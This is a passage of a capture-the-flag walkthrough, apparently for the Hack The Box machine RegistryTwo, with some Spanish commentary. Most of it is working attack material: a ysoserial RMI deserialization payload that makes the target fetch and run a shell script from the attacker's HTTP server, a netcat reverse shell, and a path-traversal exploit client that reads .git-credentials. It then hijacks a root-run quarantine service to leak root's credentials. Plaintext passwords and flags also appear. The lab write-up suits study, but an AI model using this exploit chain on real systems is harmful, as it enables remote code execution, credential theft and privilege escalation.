[/home/zsln/Desktop/zsln/RegistryTwo/shell]
index.html  shell
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.229.28 - - [23/Feb/2026 14:34:24] "GET /shell HTTP/1.1" 200 -
```

```bash
zs1n$ java -jar rmg.jar listen --yso ysoserial-all.jar 10.10.17.19 9002 CommonsCollections6 "bash shell"
[+] Creating ysoserial payload... done.
[+] Creating a JRMPListener on 10.10.17.19:9002.
[+] Handing off to ysoserial...
Have connection from /10.129.229.28:46046
Reading message...
Sending return with payload for obj [0:0:0, 0]
Closing connection
```

```bash
zs1n$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.28] 40565
/bin/sh: can't access tty; job control turned off
/usr/local/tomcat $ id
uid=1000(app) gid=1000(app) groups=1000(app)
/usr/local/tomcat $
```

```java
package com.htb.hosting.rmi; import java.rmi.Remote; import java.rmi.RemoteException; public interface FileService extends Remote { byte[] view(String path) throws RemoteException; // Agregamos solo el que necesitamos para simplificar }
```

```bash
zs1n$> cat Exploit.java
package com.htb.hosting.rmi;

import com.htb.hosting.rmi.AbstractFile;

import java.nio.charset.StandardCharsets;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import java.util.Arrays;
import java.util.Base64;
import java.util.List;


public class Exploit {
    public static void main(String[] args) {
        String cmd = args[0];

        try {
            Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9002);
            FileService stub = (FileService) registry.lookup("FileService");

            if (cmd.equals("list")) {
                List<AbstractFile> response = stub.list(args[1], args[2]);
                response.stream().map(f -> f.getDisplayName()).forEach(System.out::println);
            } else if (cmd.equals("createDirectory")) {
                boolean response = stub.createDirectory(args[1], args[2]);
                System.out.println(response);
            } else if (cmd.equals("view")) {
                byte[] response = stub.view(args[1], args[2]);
                System.out.println(new String(response, StandardCharsets.UTF_8));
            } else if (cmd.equals("newDomain")) {
                boolean response = stub.newDomain(args[1]);
                System.out.println(response);
            } else if (cmd.equals("uploadFile")) {
                boolean response = stub.uploadFile(args[1], args[2], Base64.getDecoder().decode(args[3]));
                System.out.println(response);
            }
        } catch (Exception e) {
            System.err.println("Client exception: " + e.toString());
            e.printStackTrace();
        }
    }
}

zs1n$> exploit javac -source 1.8 -target 1.8 -cp . Exploit.java
zs1n$> javac -source 1.8 -target 1.8 -cp . Exploit.java
warning: [options] bootstrap class path not set in conjunction with -source 8
1 warning

zs1n$> mv Exploit.class com/htb/hosting/rmi

zs1n$> cat MANIFEST.MF
Manifest-Version: 1.0
Created-By: IntelliJ IDEA
Built-By: dsoot
Build-Jdk: version 11.0.11
Main-Class:  com.htb.hosting.rmi.Exploit


zs1n$> jar cvfm exploit.jar MANIFEST.MF -C . .
added manifest
```

```bash
java -jar exploit.jar list deadbeef ../../../home/developer
..
.cache
.bash_logout
.bashrc
.bash_history
.git-credentials
user.txt
.gnupg
.profile
.vimrc
```



```bash
java -jar exploit.jar newDomain deadbeef
true
```

```bash
java -jar exploit.jar view deadbeef ../../../home/developer/.git-credentials
https://irogir:qybWiMTRg0sIHz4beSTUzrVIl7t3YsCj9@github.com

java -jar exploit.jar view deadbeef ../../../home/developer/user.txt
Client exception: java.nio.file.AccessDeniedException: /sites/www.static-deadbeef.webhosting.htb/../../../home/developer/user.txt
```


```absh
zs1n$ ssh developer@webhosting.htb
The authenticity of host 'webhosting.htb (10.129.229.28)' can't be established.
ED25519 key fingerprint is: SHA256:MAsPYw/jBZT2Jey1YCF7JJ36wOqpd37giePk2KngbpM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'webhosting.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
developer@webhosting.htb's password:
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Feb 23 20:10:01 UTC 2026

  System load:  0.01              Users logged in:                0
  Usage of /:   72.6% of 7.71GB   IP address for eth0:            10.129.229.28
  Memory usage: 57%               IP address for docker0:         172.17.0.1
  Swap usage:   0%                IP address for br-59a3a780b7b3: 172.19.0.1
  Processes:    194


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

28 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 18.04 at
https://ubuntu.com/18-04


Last login: Mon Jul 17 12:11:10 2023 from 10.10.14.23
developer@registry:~$ cat user.txt
f9de162d25012ac3f88daacff01a325b
```

```bash
2026/02/24 04:42:01 CMD: UID=0     PID=32652  | /usr/bin/java -jar /usr/share/vhost-manage/includes/quarantine.jar
```


```bash
developer@registry:~$ find / -name \*.jar 2>/dev/null 
/opt/registry.jar 
/usr/share/ca-certificates-java/ca-certificates-java.jar 
/usr/share/vhost-manage/includes/quarantine.jar 
/usr/share/apport/testsuite/crash.jar 
/usr/share/apport/apport.jar 
/usr/share/java/java-atk-wrapper.jar 
/usr/share/java/libintl.jar 
/usr/lib/jvm/java-17-openjdk-amd64/lib/jrt-fs.jar 
/usr/lib/jvm/java-11-openjdk-amd64/lib/jrt-fs.jar  
```

```java
 public Client() throws RemoteException, NotBoundException {
    Registry registry = LocateRegistry.getRegistry("localhost", 9002);
    QuarantineService server = (QuarantineService)registry.lookup("QuarantineService");
    this.config = server.getConfiguration();
    this.clamScan = new ClamScan(this.config);
  }
```

Mira la clase `Client`:

```
File[] documentRoots = this.config.getMonitorDirectory().listFiles();
// ...
ScanResult scanResult = this.clamScan.scanPath(path.toAbsolutePath().toString());
// ...
quarantine(file); // Copia archivos
```

Si tú controlas el objeto `QuarantineConfiguration` que recibe el proceso root, puedes cambiar el `monitorDirectory` y el `quarantineDirectory`.

```java
zs1n$> cat FakeQuarantine.java
package com.htb.hosting.rmi.quarantine;

import java.io.File;
import java.rmi.RemoteException;

public class QuarantineServiceImpl implements QuarantineService {
    @Override
    public QuarantineConfiguration getConfiguration() throws RemoteException {
        return new QuarantineConfiguration(new File("/dev/shm"), new File("/root"), "10.10.17.19", 3310, 1000);
    }
}
```

```bash
eveloper@registry:/dev/shm$ java -jar registry-zsln.jar
Exception in thread "main" java.rmi.server.ExportException: Port already in use: 9002; nested exception is:
	java.net.BindException: Address already in use
	at java.rmi/sun.rmi.transport.tcp.TCPTransport.listen(TCPTransport.java:346)
	at java.rmi/sun.rmi.transport.tcp.TCPTransport.exportObject(TCPTransport.java:243)
	at java.rmi/sun.rmi.transport.tcp.TCPEndpoint.exportObject(TCPEndpoint.java:415)
	at java.rmi/sun.rmi.transport.LiveRef.exportObject(LiveRef.java:147)
	at java.rmi/sun.rmi.server.UnicastServerRef.exportObject(UnicastServerRef.java:235)
	at java.rmi/sun.rmi.registry.RegistryImpl.setup(RegistryImpl.java:223)
	at java.rmi/sun.rmi.registry.RegistryImpl.<init>(RegistryImpl.java:208)
	at java.rmi/java.rmi.registry.LocateRegistry.createRegistry(LocateRegistry.java:203)
	at com.htb.hosting.rmi.Server.main(Server.java:15)
Caused by: java.net.BindException: Address already in use
	at java.base/sun.nio.ch.Net.bind0(Native Method)
	at java.base/sun.nio.ch.Net.bind(Net.java:555)
	at java.base/sun.nio.ch.Net.bind(Net.java:544)
	at java.base/sun.nio.ch.NioSocketImpl.bind(NioSocketImpl.java:643)
	at java.base/java.net.ServerSocket.bind(ServerSocket.java:388)
	at java.base/java.net.ServerSocket.<init>(ServerSocket.java:274)
	at java.base/java.net.ServerSocket.<init>(ServerSocket.java:167)
	at java.rmi/sun.rmi.transport.tcp.TCPDirectSocketFactory.createServerSocket(TCPDirectSocketFactory.java:45)
	at java.rmi/sun.rmi.transport.tcp.TCPEndpoint.newServerSocket(TCPEndpoint.java:673)
	at java.rmi/sun.rmi.transport.tcp.TCPTransport.listen(TCPTransport.java:335)
	... 8 more
```

```bash
developer@registry:/dev/shm$ while ! java -jar registry-zsln.jar 2>/dev/null; do printf "\r%s" "$(date)"; done
Tue Feb 24 05:24:01 UTC 2026[+] Bound to 9002
```

```bash
$ nc -nlvp 3310 
Listening on 0.0.0.0 3310 
Connection received on 10.10.11.223 58580 
zSCAN /root/.docker/buildx/.lock
<SNIP>
zSCAN /root/.git-credentials
```

```bash
https://admin:52nWqz3tejiImlbsihtV@github.com
```

```bash
developer@registry:~$ su root
Password:
root@registry:/home/developer# cat /root/root.txt
ce506bb9f649f0ecc7f48bbc67714c5b
```

```bash
sudo update-alternatives --config javac
```